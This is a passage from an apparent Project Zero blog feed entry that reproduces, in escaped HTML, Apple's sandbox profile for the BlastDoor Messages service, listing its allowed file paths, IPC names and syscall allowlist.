class="c1"&gt;&lt;span class="c3"&gt;;;; For all platforms: /System/Library/PrivateFrameworks/MessagesBlastDoorSupport.framework/XPCServices/MessagesBlastDoorService.xpc/MessagesBlastDoorService&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(version 1)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; -------------------------------------------------------------------------------------------- ;;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; Basic Rules&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; -------------------------------------------------------------------------------------------- ;;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Deny all default rules.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny default)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny file-map-executable process-info* nvram*)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny dynamic-code-generation)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Rules copied from system.sb. Ones that we&amp;#39;ve deemed overly permissive&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; or unnecessary for BlastDoor have been removed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Allow read access to standard system paths.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(require-all (file-mode #o0004)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (require-any (subpath &amp;quot;/System&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(subpath &amp;quot;/usr/lib&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(subpath &amp;quot;/usr/share&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(subpath &amp;quot;/private/var/db/dyld&amp;quot;))))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-map-executable&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(subpath &amp;quot;/System/Library/CoreServices/RawCamera.bundle&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(subpath &amp;quot;/usr/lib&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(subpath &amp;quot;/System/Library/Frameworks&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-test-existence (subpath &amp;quot;/System&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read-metadata&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/etc&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/tmp&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/var&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/private/etc/localtime&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Allow access to standard special files.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/dev/random&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/dev/urandom&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read* file-write-data&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/dev/null&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/dev/zero&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read* file-write-data file-ioctl&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(literal &amp;quot;/dev/dtracehelper&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; TODO: Don&amp;#39;t allow core dumps to be written out unless this is on a dev&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; fused device?&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-write*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(require-all (regex #&amp;quot;^/cores/&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (require-not (file-mode 0))))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Allow IPC to standard system agents.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow mach-lookup&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(global-name &amp;quot;com.apple.diagnosticd&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(global-name &amp;quot;com.apple.logd&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(global-name &amp;quot;com.apple.system.DirectoryService.libinfo_v1&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(global-name &amp;quot;com.apple.system.logger&amp;quot;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(global-name &amp;quot;com.apple.system.notification_center&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Allow mostly harmless operations.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow signal process-info-dirtycontrol process-info-pidinfo&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(target self))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Temporarily allow sysctl-read with reporting to see if this is&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; used for anything.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow (with report) sysctl-read)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; We don&amp;#39;t need to post any darwin notifications.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny darwin-notification-post)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; We shouldn&amp;#39;t allow any other file operations not covered under&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; the default of deny above.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny file-clone file-link)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Don&amp;#39;t deny file-test-existence: &amp;lt;rdar://problem/59611011&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; (deny file-test-existence)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Don&amp;#39;t allow access to any IOKit properties.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny iokit-get-properties)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny mach-cross-domain-lookup)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Don&amp;#39;t allow BlastDoor to spawn any other XPC services other than&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; ones that we can intentionally whitelist later.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny mach-lookup (xpc-service-name-regex #&amp;quot;.*&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Don&amp;#39;t allow any commands on sockets.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny socket-ioctl)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Denying this should have no ill effects for our use case.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(deny system-privilege)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; To be uncommented once the system call whitelist is complete...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; (deny syscall-unix (with send-signal SIGKILL))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow syscall-unix&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_exit)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_kevent_qos)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_kevent_id)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_thread_selfid)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_bsdthread_ctl)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_kdebug_trace64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_getattrlist)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_sigsuspend_nocancel)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_proc_info)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS___disable_threadsignal)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS___pthread_sigmask)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS___mac_syscall)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS___semwait_signal_nocancel)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_abort_with_payload)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_access)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_bsdthread_create)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_bsdthread_terminate)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_close)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_close_nocancel)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_connect)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_csops_audittoken)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_csrctl)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_fcntl)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_fsgetpath)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_fstat64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_fstatfs64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_getdirentries64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_geteuid)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_getfsstat64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_getgid)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_getrlimit)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_getuid)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_ioctl)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_issetugid)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_lstat64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_madvise)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_mmap)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_munmap)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_mprotect)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_mremap_encrypted)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_open)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_open_nocancel)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_openat)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_pathconf)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_pread)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_read)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_readlink)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_shm_open)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_socket)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_stat64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_statfs64)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_sysctl)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_sysctlbyname)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_workq_kernreturn)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(syscall-number SYS_workq_open)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Still allow the system call but report in log.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow (with report) syscall-unix)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; For validating the entitlements of clients. This is so only entitled&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; clients can pass data into a BlastDoor instance.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow process-info-codesignature)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; -------------------------------------------------------------------------------------------- ;;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; Reading Files&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;;; -------------------------------------------------------------------------------------------- ;;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; Support for BlastDoor receiving sandbox extensions from clients to either read files, or&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; write to a target location.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; com.apple.app-sandbox.read&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(extension &amp;quot;com.apple.app-sandbox.read&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;;; com.apple.app-sandbox.read-write&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;(allow file-read* file-write*&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(extension &amp;quot;com.apple.app-sandbox.read-write&amp;quot;))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/405547501763334781/comments/default" title="Post Comments" />
